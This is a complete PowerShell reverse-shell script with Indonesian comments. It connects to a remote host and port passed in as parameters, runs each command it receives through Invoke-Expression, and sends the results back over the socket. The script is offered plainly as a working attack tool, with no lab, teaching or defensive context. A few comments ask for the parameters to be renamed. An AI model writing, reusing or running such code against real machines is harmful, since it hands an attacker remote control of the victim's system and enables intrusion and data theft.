# ReverseShell.ps1
param (
    [string]$RemoteHost,  # Ganti nama parameter
    [int]$RemotePort      # Ganti nama parameter
)

# Fungsi untuk membuat koneksi reverse shell
function Start-ReverseShell {
    param (
        [string]$RemoteHost,  # Ganti nama parameter
        [int]$RemotePort      # Ganti nama parameter
    )

    # Membuat objek TCPClient dan menghubungkan ke host dan port
    $TCPClient = New-Object Net.Sockets.TCPClient($RemoteHost, $RemotePort)
    $NetworkStream = $TCPClient.GetStream()
    $StreamReader = New-Object IO.StreamReader($NetworkStream)
    $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
    $StreamWriter.AutoFlush = $true
    $Buffer = New-Object System.Byte[] 1024

    # Loop untuk mendengarkan dan mengeksekusi perintah yang diterima
    while ($TCPClient.Connected) {
        while ($NetworkStream.DataAvailable) {
            $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
            $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1)

            if ($Code.Length -gt 0) {
                # Menjalankan perintah yang diterima
                $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }
                # Mengirimkan hasil kembali ke server
                $StreamWriter.Write("$Output`n")
            }
        }
    }

    # Menutup koneksi saat selesai
    $TCPClient.Close()
    $NetworkStream.Close()
    $StreamReader.Close()
    $StreamWriter.Close()
}

# Menjalankan fungsi reverse shell dalam latar belakang
Start-ReverseShell -RemoteHost $RemoteHost -RemotePort $RemotePort
